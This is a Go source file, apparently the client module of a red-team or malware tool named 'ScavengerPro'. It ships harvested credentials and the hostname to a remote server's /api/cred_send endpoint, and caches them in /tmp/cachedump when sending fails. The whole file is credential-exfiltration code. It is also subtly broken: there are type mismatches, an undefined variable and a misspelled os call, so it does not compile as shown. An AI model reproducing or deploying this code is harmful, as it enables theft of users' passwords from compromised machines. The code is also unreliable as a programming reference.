// ship the credential cache to the server
// @author: degenerat3

package main

import(
	"fmt"
	"net/http"
	"bytes"
	"encoding/json"
	"ScavengerPro/client/cred_cache"
	"os"
	"io"
	"bufio"
)

var serv = "127.0.0.1:5000" 	//IP of server

func send_data(c cred_cache.CredCache){
	h := c.Get_hostname()
	creds := c.Get_entries()
	fmt.Printf("%s\n", h)
	fmt.Printf("%s\n", creds)
	url := "http://" + serv + "/api/cred_send"	//turn ip into URL
	jsonData := map[string]string{"hostname": h, "credentials": creds}
	jsonValue, _ := json.Marshal(jsonData)
	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil{
		// TODO: write to disk if it fails
		path := "/tmp/cachedump"
		dump_cache(creds, path)
		return
	}

}

func dump_cache(creds []string, path string){
	_, err := os.Stat(path)
	if os.IsNotExist(err){
		var f, _ = os.Create(path)
		defer file.Close()
	} else{
		var f, _ = os.openFile(path, os.O_APPEND|os.O_WRONLY, 0600)
	}
	for _, cred := range creds {
		fmt.Fprintln(f, cred)
	}
	return
}

func fetch_dump(path string) []string{
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var data []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan(){
		data = append(data, scanner.Text())
	}
	return data
}


func ship_it(c cred_cache.CredCache, min int){
	if c.Count_entries() < min{
		return	// not enough passwords to ship
	}
	send_data(c)
	return
}

func main(){
	c := cred_cache.CredCache {
		Hostname: "malBox",
		Credentials: []string{"root:hunter2","jim:letmein"},
	}
	send_data(c)
}
